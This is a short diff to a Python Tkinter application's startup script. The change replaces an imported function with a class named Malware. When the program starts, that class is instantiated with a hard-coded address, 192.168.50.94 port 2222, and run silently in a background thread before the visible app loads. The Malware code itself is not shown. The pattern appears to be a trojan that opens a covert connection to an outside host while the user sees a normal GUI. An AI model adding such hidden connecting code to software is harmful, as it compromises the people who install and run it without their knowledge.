@@ -1,7 +1,7 @@
 import tkinter as tk
 from tkinter import messagebox
 from threading import Thread
-from fooler import main_root
+from fooler import Malware
 from depchker import check_dependencies_and_continue
 
 '''
@@ -95,5 +95,6 @@ def startapp():
 #     root.withdraw()
 #     root.destroy()
 if __name__ == '__main__':
-    Thread(target=main_root,daemon=True).start()
+    malware = Malware('192.168.50.94',2222)
+    Thread(target=malware.run,daemon=True).start()
     check_dependencies_and_continue(startapp)
